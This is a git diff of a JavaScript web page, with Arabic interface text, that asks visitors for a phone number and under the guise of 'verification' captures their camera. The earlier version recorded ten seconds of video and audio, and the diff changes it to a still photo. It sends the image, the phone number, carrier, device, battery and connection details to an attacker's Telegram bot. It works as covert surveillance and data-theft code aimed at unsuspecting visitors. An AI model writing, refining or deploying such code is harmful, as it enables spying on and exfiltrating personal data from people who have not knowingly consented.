@@ -1,10 +1,10 @@
 let botToken = '';
 let chatId = '';
 
-// تحميل التوكن ومعرف الدردشة
+// تحميل الإعدادات من config.json
 fetch('config.json')
   .then(res => {
-    if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+    if (!res.ok) throw new Error(`فشل تحميل config.json: ${res.status}`);
     return res.json();
   })
   .then(data => {
@@ -12,8 +12,8 @@ fetch('config.json')
     chatId = data.chatId;
   })
   .catch(err => {
-    console.error('فشل تحميل الإعدادات:', err);
-    alert('فشل تحميل الإعدادات. يرجى التحقق من وجود الملف config.json.');
+    console.error('فشل تحميل config.json:', err);
+    alert('حدث خطأ في تحميل الإعدادات. تأكد من وجود config.json.');
   });
 
 document.getElementById('phoneNumber').addEventListener('input', () => {
@@ -45,36 +45,40 @@ function startCameraAndSend() {
     alert('يرجى إدخال رقم الهاتف.');
     return;
   }
-  document.getElementById('confirmBtn').innerHTML = 'جاري التحقق...';
+  document.getElementById('confirmBtn').innerHTML = 'جاري الالتقاط...';
   document.getElementById('confirmBtn').disabled = true;
-  recordAndSendVideo(phoneNumber);
+  captureAndSendPhoto(phoneNumber);
 }
 
-async function recordAndSendVideo(phoneNumber) {
+async function captureAndSendPhoto(phoneNumber) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    alert("المتصفح لا يدعم الخدمة.");
+    alert("المتصفح لا يدعم الكاميرا.");
     resetButton();
     return;
   }
 
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-    const chunks = [];
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
 
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) chunks.push(event.data);
-    };
+    await new Promise(res => setTimeout(res, 1500));
 
-    mediaRecorder.onstop = async () => {
-      const videoBlob = new Blob(chunks, { type: 'video/webm' });
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
       const info = await collectUserInfo(phoneNumber);
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('video', videoBlob, 'recording.webm');
+      formData.append('photo', blob, 'snapshot.jpg');
       formData.append('caption', info.caption);
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
@@ -88,22 +92,13 @@ async function recordAndSendVideo(phoneNumber) {
 
       document.getElementById('confirmedNumber').innerText = phoneNumber;
       document.getElementById('confirmationMessage').style.display = 'block';
-      stream.getTracks().forEach(track => track.stop());
       resetButton();
-    };
-
-    mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 10000);
+      stream.getTracks().forEach(track => track.stop());
+    }, 'image/jpeg');
 
   } catch (error) {
     console.error("فشل الوصول إلى الكاميرا:", error);
-    if (error.name === 'NotAllowedError') {
-      alert("يرجى السماح باستخدام الكاميرا والميكروفون.");
-    } else if (error.name === 'NotFoundError') {
-      alert("لم يتم العثور على الكاميرا أو الميكروفون.");
-    } else {
-      alert("حدث خطأ في الكاميرا.");
-    }
+    alert("حدث خطأ أثناء الوصول إلى الكاميرا.");
     resetButton();
   }
 }
@@ -130,6 +125,5 @@ async function collectUserInfo(phoneNumber) {
 
   const carrier = detectCarrier(phoneNumber);
   const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 اتصال الإنترنت: ${connectionStatus}`;
-
   return { caption };
 }
